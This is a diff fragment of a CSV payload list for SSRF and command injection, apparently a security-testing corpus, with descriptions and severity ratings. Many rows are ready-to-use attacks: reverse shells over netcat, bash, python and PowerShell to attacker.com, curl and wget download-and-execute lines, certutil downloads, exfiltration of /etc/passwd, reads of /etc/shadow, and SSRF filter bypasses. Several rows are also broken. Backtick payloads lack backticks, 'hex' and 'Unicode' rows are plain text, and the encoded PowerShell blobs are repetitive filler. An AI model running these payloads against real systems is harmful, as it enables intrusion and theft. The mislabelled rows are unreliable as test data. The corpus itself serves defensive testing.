+ssrf-059,ssrf,SSRF,SSRF with mqtt protocol,mqtt://127.0.0.1:1883,Access MQTT broker,medium
+ssrf-060,ssrf,SSRF,SSRF with ws protocol (WebSocket),ws://127.0.0.1:8080/,Access WebSocket service,medium
+ssrf-061,ssrf,SSRF,SSRF with wss protocol (Secure WebSocket),wss://127.0.0.1:8443/,Access secure WebSocket service,medium
+ssrf-062,ssrf,SSRF,SSRF with bitcoin protocol,bitcoin://127.0.0.1/,Bitcoin protocol scheme,low
+ssrf-063,ssrf,SSRF,SSRF with magnet protocol,magnet:?xt=urn:btih:abcdef1234567890,Magnet link protocol,low
+ssrf-064,ssrf,SSRF,SSRF with ssh protocol,ssh://127.0.0.1:22,Access SSH service,medium
+ssrf-065,ssrf,SSRF,SSRF with tel protocol,tel:+1234567890,Telephone protocol,low
+ssrf-066,ssrf,SSRF,SSRF with sms protocol,sms:+1234567890,SMS protocol,low
+ssrf-067,ssrf,SSRF,SSRF with geo protocol,"geo:37.786971,-122.399677",Geolocation protocol,low
+ssrf-068,ssrf,SSRF,SSRF with svn protocol,svn://127.0.0.1/repo,Subversion protocol,medium
+ssrf-069,ssrf,SSRF,SSRF with git protocol,git://127.0.0.1/repo.git,Git protocol,medium
+ssrf-070,ssrf,SSRF,SSRF with sftp protocol,sftp://127.0.0.1/home/user/,Secure FTP protocol,medium
+ssrf-071,ssrf,SSRF,SSRF with double URL encoding,http://%2531%25327%2532%253E%253E%253E/,Double URL encoded IP,high
+ssrf-072,ssrf,SSRF,SSRF with mixed case scheme to bypass filters,HtTp://127.0.0.1/,Mixed case HTTP scheme,medium
+ssrf-073,ssrf,SSRF,SSRF with embedded null byte to bypass filters,http://127.0.0.1%00.example.com/,Null byte injection,high
+ssrf-074,ssrf,SSRF,SSRF with CRLF injection in URL,"http://127.0.0.1/
+Set-Cookie:evil=1",CRLF injection,critical
+ssrf-075,ssrf,SSRF,SSRF with protocol chaining using gopher,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,Gopher protocol to Redis,critical
+ssrf-076,ssrf,SSRF,SSRF with IPv6 embedded IPv4 and port,http://[::ffff:192.168.1.1]:8080/,IPv6 embedded IPv4 with port,high
+ssrf-077,ssrf,SSRF,SSRF with DNS rebinding via external domain,http://evil.com/,DNS rebinding attack,critical
+ssrf-078,ssrf,SSRF,SSRF with HTTP header injection via URL encoding,http://127.0.0.1/%0d%0aX-Injected-Header:evil,HTTP header injection,critical
+ssrf-079,ssrf,SSRF,SSRF with HTTP request smuggling attempt,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,Request smuggling,critical
+ssrf-080,ssrf,SSRF,SSRF with file protocol and directory traversal,file:///etc/passwd%00,File read with null byte,critical
+ssrf-081,ssrf,SSRF,SSRF with HTTP basic auth and URL encoding,http://admin%3Apassword@127.0.0.1/,Basic auth with encoding,high
+ssrf-082,ssrf,SSRF,SSRF with HTTP redirect to internal IP,http://external.com/redirect?url=http://127.0.0.1/,Redirect to internal IP,high
+ssrf-083,ssrf,SSRF,SSRF with HTTP POST method override,http://127.0.0.1/?_method=POST,Method override,medium
+ssrf-084,ssrf,SSRF,SSRF with HTTP chunked transfer encoding,http://127.0.0.1/chunked,Chunked transfer encoding,medium
+ssrf-085,ssrf,SSRF,SSRF with HTTP TRACE method,http://127.0.0.1/trace,HTTP TRACE method,medium
+ssrf-086,ssrf,SSRF,SSRF with HTTP OPTIONS method,http://127.0.0.1/options,HTTP OPTIONS method,medium
+ssrf-087,ssrf,SSRF,SSRF with HTTP CONNECT method,http://127.0.0.1/connect,HTTP CONNECT method,medium
+ssrf-088,ssrf,SSRF,SSRF with HTTP PATCH method,http://127.0.0.1/patch,HTTP PATCH method,medium
+ssrf-089,ssrf,SSRF,SSRF with HTTP DELETE method,http://127.0.0.1/delete,HTTP DELETE method,medium
+ssrf-090,ssrf,SSRF,SSRF with HTTP PUT method,http://127.0.0.1/put,HTTP PUT method,medium
+ssrf-091,ssrf,SSRF,SSRF with IPv4 in hexadecimal,http://0x7f.0x0.0x0.0x1/,Hexadecimal IPv4 address,high
+ssrf-092,ssrf,SSRF,SSRF with IPv4 in mixed notation,http://127.1/,Shortened IPv4 address,high
+ssrf-093,ssrf,SSRF,SSRF with IPv4 in integer format,http://2130706433/,Integer IPv4 address,high
+ssrf-094,ssrf,SSRF,SSRF with HTTP userinfo section to bypass filters,http://127.0.0.1@evil.com/,Userinfo in URL,high
+ssrf-095,ssrf,SSRF,SSRF with HTTP URL fragment,http://127.0.0.1/#fragment,URL fragment,low
+ssrf-096,ssrf,SSRF,SSRF with HTTP URL query parameter injection,http://127.0.0.1/?param=value,Query parameter,low
+ssrf-097,ssrf,SSRF,SSRF with HTTP URL path traversal,http://127.0.0.1/../../../../etc/passwd,Path traversal,critical
+ssrf-098,ssrf,SSRF,SSRF with HTTP URL encoded path traversal,http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd,URL encoded path traversal,critical
+ssrf-099,ssrf,SSRF,SSRF with HTTP URL encoded double slash,http://127.0.0.1/%2f%2f/etc/passwd,Encoded double slash,critical
+ssrf-100,ssrf,SSRF,SSRF with HTTP URL with mixed encoding and case,http://%31%32%37.%30.%30.%31/%2E%2E/%2e%2e/%2E%2e/etc/passwd,Mixed encoding and case path traversal,critical
+cmdinj-001,cmdinj,Command Injection,Basic command injection with semicolon,; ls -la,Inject list directory command,high
+cmdinj-002,cmdinj,Command Injection,Command injection with && operator,&& cat /etc/passwd,Inject read passwd file,critical
+cmdinj-003,cmdinj,Command Injection,Command injection with pipe operator,| whoami,Inject whoami command,high
+cmdinj-004,cmdinj,Command Injection,Command injection with backticks,id,Inject id command using backticks,high
+cmdinj-005,cmdinj,Command Injection,Command injection with $() syntax,$(uname -a),Inject uname command,high
+cmdinj-006,cmdinj,Command Injection,Command injection with nested $(),$(echo $(whoami)),Nested command substitution,high
+cmdinj-007,cmdinj,Command Injection,Command injection with ampersand and sleep,& sleep 10,Inject sleep command for timing attack,medium
+cmdinj-008,cmdinj,Command Injection,Command injection with newline character,"&& echo 'injected'
+",Inject command with newline,high
+cmdinj-009,cmdinj,Command Injection,Command injection with semicolon and curl,; curl http://attacker.com,Exfiltrate data via curl,critical
+cmdinj-010,cmdinj,Command Injection,Command injection with semicolon and wget,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute malware,critical
+cmdinj-011,cmdinj,Command Injection,Command injection with pipe and netcat reverse shell,| nc attacker.com 4444 -e /bin/sh,Reverse shell via netcat,critical
+cmdinj-012,cmdinj,Command Injection,Command injection with backticks and whoami,whoami,Execute whoami command,high
+cmdinj-013,cmdinj,Command Injection,Command injection with $() and id,$(id),Execute id command,high
+cmdinj-014,cmdinj,Command Injection,Command injection with semicolon and echo,; echo injected,Simple echo injection,medium
+cmdinj-015,cmdinj,Command Injection,Command injection with && and cat /etc/shadow,&& cat /etc/shadow,Read shadow file,critical
+cmdinj-016,cmdinj,Command Injection,Command injection with semicolon and id,; id,Execute id command,high
+cmdinj-017,cmdinj,Command Injection,Command injection with pipe and env,| env,Print environment variables,medium
+cmdinj-018,cmdinj,Command Injection,Command injection with backticks and ls,ls /,List root directory,high
+cmdinj-019,cmdinj,Command Injection,Command injection with $() and ps,$(ps aux),List running processes,medium
+cmdinj-020,cmdinj,Command Injection,Command injection with semicolon and whoami,; whoami,Execute whoami command,high
+cmdinj-021,cmdinj,Command Injection,Command injection with URL encoding,%3B%20id,URL encoded semicolon and id command,high
+cmdinj-022,cmdinj,Command Injection,Command injection with nested backticks,`echo \whoami\`,Nested backticks execution,high
+cmdinj-023,cmdinj,Command Injection,Command injection with environment variable,; echo $USER,Print current user environment variable,medium
+cmdinj-024,cmdinj,Command Injection,Command injection with hex encoded characters,; echo injected,Hex encoded space character,medium
+cmdinj-025,cmdinj,Command Injection,Command injection with base64 encoded command,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,critical
+cmdinj-026,cmdinj,Command Injection,Command injection with command substitution and sleep,$(sleep 10),Timing attack with sleep,medium
+cmdinj-027,cmdinj,Command Injection,Command injection with semicolon and nested $(),; echo $(whoami),Nested command substitution,high
+cmdinj-028,cmdinj,Command Injection,Command injection with backslash escaping,; echo injected\; ls,Escape semicolon,medium
+cmdinj-029,cmdinj,Command Injection,Command injection with multiple command separators,; ls -la && whoami || echo failed,Multiple command chaining,high
+cmdinj-030,cmdinj,Command Injection,Command injection with command grouping,; (id; uname -a),Grouped commands,high
+cmdinj-031,cmdinj,Command Injection,Command injection with subshell,; (sleep 5),Subshell with sleep,medium
+cmdinj-032,cmdinj,Command Injection,Command injection with command chaining and comments,; ls -la #,Command injection with comment,medium
+cmdinj-033,cmdinj,Command Injection,Command injection with backticks and nested $(),echo $(whoami),Nested command execution,high
+cmdinj-034,cmdinj,Command Injection,Command injection with semicolon and environment variable expansion,; echo $PATH,Print PATH environment variable,medium
+cmdinj-035,cmdinj,Command Injection,Command injection with command substitution and echo,$(echo injected),Echo injected string,medium
+cmdinj-036,cmdinj,Command Injection,Command injection with semicolon and nested subshell,; (echo injected; whoami),Multiple commands in subshell,high
+cmdinj-037,cmdinj,Command Injection,Command injection with semicolon and sleep for timing,; sleep 15,Timing attack,medium
+cmdinj-038,cmdinj,Command Injection,Command injection with pipe and reverse shell,| nc attacker.com 4444 -e /bin/sh,Reverse shell via netcat,critical
+cmdinj-039,cmdinj,Command Injection,Command injection with semicolon and wget download,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute script,critical
+cmdinj-040,cmdinj,Command Injection,Command injection with semicolon and curl download,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Download and execute script,critical
+cmdinj-041,cmdinj,Command Injection,Command injection with semicolon and base64 decode,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,critical
+cmdinj-042,cmdinj,Command Injection,Command injection with semicolon and environment variable manipulation,; export MALICIOUS=1,Set environment variable,medium
+cmdinj-043,cmdinj,Command Injection,Command injection with semicolon and echo to file,; echo 'malicious' > /tmp/malicious.txt,Write to file,medium
+cmdinj-044,cmdinj,Command Injection,Command injection with semicolon and chmod,; chmod +x /tmp/m.sh,Change file permissions,medium
+cmdinj-045,cmdinj,Command Injection,Command injection with semicolon and cat /etc/shadow,; cat /etc/shadow,Read shadow file,critical
+cmdinj-046,cmdinj,Command Injection,Command injection with semicolon and echo with special characters,; echo 'injected; ls -la',Echo with special characters,medium
+cmdinj-047,cmdinj,Command Injection,Command injection with semicolon and nested command with quotes,"; echo ""$(whoami)""",Nested command with quotes,high
+cmdinj-048,cmdinj,Command Injection,Command injection with semicolon and awk command,"; awk 'BEGIN {system(""id"")}'",Execute command via awk,high
+cmdinj-049,cmdinj,Command Injection,Command injection with semicolon and perl command,; perl -e 'print id',Execute command via perl,high
+cmdinj-050,cmdinj,Command Injection,Command injection with semicolon and python command,"; python -c 'import os; os.system(""id"")'",Execute command via python,high
+cmdinj-051,cmdinj,Command Injection,Windows cmd injection with & separator,& whoami,Execute whoami command,high
+cmdinj-052,cmdinj,Command Injection,Windows cmd injection with | separator,| dir,List directory contents,high
+cmdinj-053,cmdinj,Command Injection,Windows cmd injection with && separator,&& ipconfig,Display network config,high
+cmdinj-054,cmdinj,Command Injection,Windows cmd injection with || separator,|| net user,List users,high
+cmdinj-055,cmdinj,Command Injection,Windows PowerShell injection with semicolon,; Get-Process,List running processes,high
+cmdinj-056,cmdinj,Command Injection,Windows PowerShell injection with backtick,whoami,Execute whoami,high
+cmdinj-057,cmdinj,Command Injection,Windows PowerShell injection with $(),$(Get-ChildItem),List directory contents,high
+cmdinj-058,cmdinj,Command Injection,Windows PowerShell injection with Start-Process,; Start-Process notepad.exe,Launch notepad,medium
+cmdinj-059,cmdinj,Command Injection,Windows cmd injection with echo to file,& echo injected > C:\Windows\Temp\injected.txt,Write to file,medium
+cmdinj-060,cmdinj,Command Injection,Windows cmd injection with netcat reverse shell,& nc attacker.com 4444 -e cmd.exe,Reverse shell,critical
+cmdinj-061,cmdinj,Command Injection,macOS/Linux injection with semicolon and whoami,; whoami,Execute whoami,high
+cmdinj-062,cmdinj,Command Injection,macOS/Linux injection with pipe and id,| id,Execute id,high
+cmdinj-063,cmdinj,Command Injection,macOS/Linux injection with && and uname,&& uname -a,System info,high
+cmdinj-064,cmdinj,Command Injection,macOS/Linux injection with backticks and ls,ls /,List root directory,high
+cmdinj-065,cmdinj,Command Injection,macOS/Linux injection with $() and ps,$(ps aux),List processes,medium
+cmdinj-066,cmdinj,Command Injection,macOS/Linux injection with semicolon and curl download,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Download and execute script,critical
+cmdinj-067,cmdinj,Command Injection,macOS/Linux injection with semicolon and wget download,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute script,critical
+cmdinj-068,cmdinj,Command Injection,macOS/Linux injection with semicolon and base64 decode,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,critical
+cmdinj-069,cmdinj,Command Injection,Windows PowerShell injection with encoded command,; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=,Encoded PowerShell command,high
+cmdinj-070,cmdinj,Command Injection,Windows cmd injection with for loop,"& for /L %i in (1,1,5) do @echo %i",Loop command,medium
+cmdinj-071,cmdinj,Command Injection,Windows PowerShell injection with Invoke-Expression,; Invoke-Expression 'whoami',Execute command,high
+cmdinj-072,cmdinj,Command Injection,macOS/Linux injection with semicolon and env,; env,Print environment variables,medium
+cmdinj-073,cmdinj,Command Injection,macOS/Linux injection with semicolon and cat /etc/passwd,; cat /etc/passwd,Read passwd file,critical
+cmdinj-074,cmdinj,Command Injection,Windows cmd injection with reg query,& reg query HKLM\Software,Query registry,medium
+cmdinj-075,cmdinj,Command Injection,Windows PowerShell injection with Get-Content,; Get-Content C:\Windows\System32\drivers\etc\hosts,Read hosts file,high
+cmdinj-076,cmdinj,Command Injection,macOS/Linux injection with semicolon and dmesg,; dmesg,Kernel messages,medium
+cmdinj-077,cmdinj,Command Injection,macOS/Linux injection with semicolon and netstat,; netstat -an,Network connections,medium
+cmdinj-078,cmdinj,Command Injection,Windows cmd injection with tasklist,& tasklist,List running tasks,medium
+cmdinj-079,cmdinj,Command Injection,Windows PowerShell injection with Get-Service,; Get-Service,List services,medium
+cmdinj-080,cmdinj,Command Injection,macOS/Linux injection with semicolon and ps aux,; ps aux,List processes,medium
+cmdinj-081,cmdinj,Command Injection,Windows cmd injection with echo and pipe,& echo injected | findstr injected,Echo and filter output,medium
+cmdinj-082,cmdinj,Command Injection,Windows PowerShell injection with Start-Process and hidden window,; Start-Process notepad.exe -WindowStyle Hidden,Launch process hidden,medium
+cmdinj-083,cmdinj,Command Injection,macOS/Linux injection with semicolon and curl to exfiltrate data,; curl http://attacker.com/?data=$(cat /etc/passwd),Exfiltrate data via curl,critical
+cmdinj-084,cmdinj,Command Injection,Windows cmd injection with powershell encoded command,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Encoded PowerShell payload,high
+cmdinj-085,cmdinj,Command Injection,macOS/Linux injection with semicolon and nc reverse shell,; nc attacker.com 4444 -e /bin/bash,Reverse shell via netcat,critical
+cmdinj-086,cmdinj,Command Injection,Windows cmd injection with certutil download,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe,Download and execute file,critical
+cmdinj-087,cmdinj,Command Injection,macOS/Linux injection with semicolon and bash reverse shell,; bash -i >& /dev/tcp/attacker.com/4444 0>&1,Reverse shell via bash,critical
+cmdinj-088,cmdinj,Command Injection,Windows PowerShell injection with Invoke-WebRequest,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1,Download and execute PowerShell script,critical
+cmdinj-089,cmdinj,Command Injection,macOS/Linux injection with semicolon and python reverse shell,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",Reverse shell via python,critical
+cmdinj-090,cmdinj,Command Injection,Windows cmd injection with powershell encoded reverse shell,& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ==,Encoded PowerShell reverse shell,critical
+cmdinj-091,cmdinj,Command Injection,Obfuscated command injection using environment variable concatenation,; e${IFS}cho injected,Bypass simple filters using ${IFS} (space) variable,high
+cmdinj-092,cmdinj,Command Injection,Command injection using Unicode encoding,; echo injected,Unicode encoded echo command,high
+cmdinj-093,cmdinj,Command Injection,Command injection with double URL encoding,%253B%2520id,Double URL encoded semicolon and id,high
+cmdinj-094,cmdinj,Command Injection,Command injection using variable substitution and command chaining,; VAR=whoami; $VAR,Use variable to execute command,high
+cmdinj-095,cmdinj,Command Injection,Command injection using nested base64 decoding and execution,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash,Decode and execute base64 payload,critical
+cmdinj-096,cmdinj,Command Injection,Command injection using less common command separator (newline),"&& echo injected
+id",Use newline as command separator,high
+cmdinj-097,cmdinj,Command Injection,Command injection using PowerShell encoded command with obfuscation,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Obfuscated PowerShell encoded command,critical
+cmdinj-098,cmdinj,Command Injection,Command injection using command substitution with nested quotes,"; echo $(echo ""$(whoami)"")",Nested command substitution with quotes,high
+cmdinj-099,cmdinj,Command Injection,Command injection using environment variable and indirect expansion,; export CMD=whoami; ${CMD},Indirect command execution via env var,high
+cmdinj-100,cmdinj,Command Injection,Command injection using awk to execute shell command,"; awk 'BEGIN {system(""id"")}'",Execute shell command via awk,high
